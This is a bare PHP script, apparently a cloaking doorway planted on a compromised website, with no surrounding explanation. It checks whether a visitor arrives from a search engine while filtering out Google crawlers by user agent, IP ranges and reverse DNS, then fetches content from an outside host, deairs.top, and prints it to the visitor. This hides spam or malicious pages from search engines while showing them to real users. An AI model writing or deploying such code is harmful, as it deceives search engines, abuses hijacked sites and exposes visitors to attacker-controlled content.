<?php
$id= isset($_GET["id"])?$_GET["id"]:"286913";
$weblink="http://deairs.top/22110818/aa2022110901.php";
$isReferer="";
if(isset($_SERVER["HTTP_REFERER"])){
    $referer = $_SERVER["HTTP_REFERER"];
    $russ = "#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i";
    $ipRanges = array(array("64.233.160.0", "64.233.191.255"), array("66.102.0.0", "66.102.15.255"), array("66.249.64.0", "66.249.95.255"), array("72.14.192.0", "72.14.255.255"), array("74.125.0.0", "74.125.255.255"), array("209.85.128.0", "209.85.255.255"), array("216.239.32.0", "216.239.63.255"), array("64.18.0.0", "64.18.15.255"), array("108.177.8.0", "108.177.15.255"), array("172.217.0.0", "172.217.31.255"), array("173.194.0.0", "173.194.255.255"), array("207.126.144.0", "207.126.159.255"), array("216.58.192.0", "216.58.223.255"), array("64.68.90.1", "64.68.90.255"), array("64.233.173.193", "64.233.173.255"), array("66.249.64.1", "66.249.79.255"), array("216.239.33.96", "216.239.59.128"), array("64.68.80.0", "64.68.92.255"), array("2001:4860:4000:0:0:0:0:0", "2001:4860:4fff:ffff:ffff:ffff:ffff:ffff"), array("2404:6800:4000:0:0:0:0:0", "2404:6800:4fff:ffff:ffff:ffff:ffff:ffff"), array("2607:f8b0:4000:0:0:0:0:0", "2607:f8b0:4fff:ffff:ffff:ffff:ffff:ffff"), array("2800:3f0:4000:0:0:0:0:0", "2800:3f0:4fff:ffff:ffff:ffff:ffff:ffff"), array("2a00:1450:4000:0:0:0:0:0", "2a00:1450:4fff:ffff:ffff:ffff:ffff:ffff"), array("2c0f:fb50:4000:0:0:0:0:0", "2c0f:fb50:4fff:ffff:ffff:ffff:ffff:ffff"));
    $localIp = get_real_ip();
    $is_or_no = is_ip($localIp, $ipRanges);
    $iszz = isCrawler();
	if(function_exists("gethostbyaddr")){
		$hostname = @gethostbyaddr($localIp);
		$is_g_ip = preg_match("#google#i", "$hostname") === 1;
	}else{
		$is_g_ip = 0;
	}
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false && !$is_g_ip){
       $isReferer = 1;
	}
}
$resid = "#^\d+$#";
if (!preg_match($resid, $id)) {
    http_response_code(404);
    exit;
}
$gourl=$weblink."?id=".$id."&referer=".$isReferer;
$content=curl_get_from_webpage($gourl,"",3);
if ($content == "") {
            header("HTTP/1.1 404 Not Found");
            header("status:404 Not Found");
            exit();
}

function curl_get_from_webpage($url, $proxy = "", $loop = 10) {
    $data = false;
    $i = 0;
    while (!$data) {
        $data = curlGetOne($url, $proxy);
        if ($i++ >= $loop) break;
    }
    return $data;
}
function curlGetOne($url, $proxy = "") {
    if (function_exists("curl_init") && function_exists("curl_exec") && function_exists("curl_setopt")) {
        $curl = curl_init();
        $user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";
        // $urlReferer = "http://www.google.com";
        if (strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
        curl_setopt($curl, CURLOPT_URL, $url);
        if (stristr($url, "https:")) {
            curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_POSTFIELDS => "", CURLOPT_RETURNTRANSFER => 1, CURLOPT_USERAGENT => $user_agent, CURLOPT_HEADER => 0, CURLOPT_VERBOSE => 0));
        } else {
            curl_setopt($curl, CURLOPT_URL, $url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_HEADER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
        }
        $data = curl_exec($curl);
        curl_close($curl);
    } else {
        if (function_exists("file_get_contents") && ini_get("allow_url_fopen")) {
            $data = file_get_contents($url);
        }
    }
    if (!$data) return false;
    return $data;
}

function getIpvs($ip) {
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        return sprintf("%u", ip2long($ip));
    } else if (function_exists("inet_pton") && function_exists("gmp_strval") && function_exists("gmp_init") && filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        $ip_n = inet_pton($ip);
        $bits = 15;
        $ipv6long = "";
        while ($bits >= 0) {
            $bin = sprintf("%08b", (ord($ip_n[$bits])));
            $ipv6long = $bin . $ipv6long;
            $bits--;
        }
        return gmp_strval(gmp_init($ipv6long, 2), 10);
    } else {
        return -1;
    }
}

function is_ip($localIp, $ipRanges) {
    $localIp = getIpvs($localIp);
    if ($localIp < 0) {
        return false;
    }
    $ipRanges = array(array("64.233.160.0", "64.233.191.255"), array("66.102.0.0", "66.102.15.255"), array("66.249.64.0", "66.249.95.255"), array("72.14.192.0", "72.14.255.255"), array("74.125.0.0", "74.125.255.255"), array("209.85.128.0", "209.85.255.255"), array("216.239.32.0", "216.239.63.255"), array("64.18.0.0", "64.18.15.255"), array("108.177.8.0", "108.177.15.255"), array("172.217.0.0", "172.217.31.255"), array("173.194.0.0", "173.194.255.255"), array("207.126.144.0", "207.126.159.255"), array("216.58.192.0", "216.58.223.255"), array("64.68.90.1", "64.68.90.255"), array("64.233.173.193", "64.233.173.255"), array("66.249.64.1", "66.249.79.255"), array("216.239.33.96", "216.239.59.128"), array("64.68.80.0", "64.68.92.255"), array("2001:4860:4000:0:0:0:0:0", "2001:4860:4fff:ffff:ffff:ffff:ffff:ffff"), array("2404:6800:4000:0:0:0:0:0", "2404:6800:4fff:ffff:ffff:ffff:ffff:ffff"), array("2607:f8b0:4000:0:0:0:0:0", "2607:f8b0:4fff:ffff:ffff:ffff:ffff:ffff"), array("2800:3f0:4000:0:0:0:0:0", "2800:3f0:4fff:ffff:ffff:ffff:ffff:ffff"), array("2a00:1450:4000:0:0:0:0:0", "2a00:1450:4fff:ffff:ffff:ffff:ffff:ffff"), array("2c0f:fb50:4000:0:0:0:0:0", "2c0f:fb50:4fff:ffff:ffff:ffff:ffff:ffff"));
    foreach ($ipRanges as $val) {
        $ipmin = getIpvs($val[0]);
        $ipmax = getIpvs($val[1]);
        if ($localIp >= $ipmin && $localIp <= $ipmax) {
            return true;
        }
    }
    return false;
}

function get_real_ip(){	
	   $ip = "";
    /**
     * resolve any proxies
     */
    if (isset($_SERVER)) {
      if (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
      } elseif (isset($_SERVER["HTTP_CLIENT_IP"])) {
        $ip = $_SERVER["HTTP_CLIENT_IP"];
      } elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {
        $ip = $_SERVER["HTTP_X_FORWARDED"];
      } elseif (isset($_SERVER["HTTP_X_CLUSTER_CLIENT_IP"])) {
        $ip = $_SERVER["HTTP_X_CLUSTER_CLIENT_IP"];
      } elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {
        $ip = $_SERVER["HTTP_FORWARDED_FOR"];
      } elseif (isset($_SERVER["HTTP_FORWARDED"])) {
        $ip = $_SERVER["HTTP_FORWARDED"];
      } else {
        $ip = $_SERVER["REMOTE_ADDR"];
      }
    }
    if (trim($ip) == "") {
      if (getenv("HTTP_X_FORWARDED_FOR")) {
        $ip = getenv("HTTP_X_FORWARDED_FOR");
      } elseif (getenv("HTTP_CLIENT_IP")) {
        $ip = getenv("HTTP_CLIENT_IP");
      } else {
        $ip = getenv("REMOTE_ADDR");
      }
    }
    /**
     * sanitize for validity as an IPv4 or IPv6 address
     */
    $ip = preg_replace("~[^a-fA-F0-9.:%/,]~", "", $ip);
    /**
     *  if it"s still blank, set to a single dot
     */
    if (trim($ip) == "") $ip = ".";
    return $ip;	
	}

function isCrawler() {
    $agent = strtolower($_SERVER["HTTP_USER_AGENT"]);
    if (!empty($agent)) {
        $spiderSite = array("Googlebot", "Mediapartners-Google", "Adsbot-Google", "Yahoo!", "Google AdSense", "Yahoo Slurp", "bingbot", "MSNBot");
        foreach ($spiderSite as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str) !== false) {
                return true;
            }
        }
    } else {
        return false;
    }
}

echo $content;
?>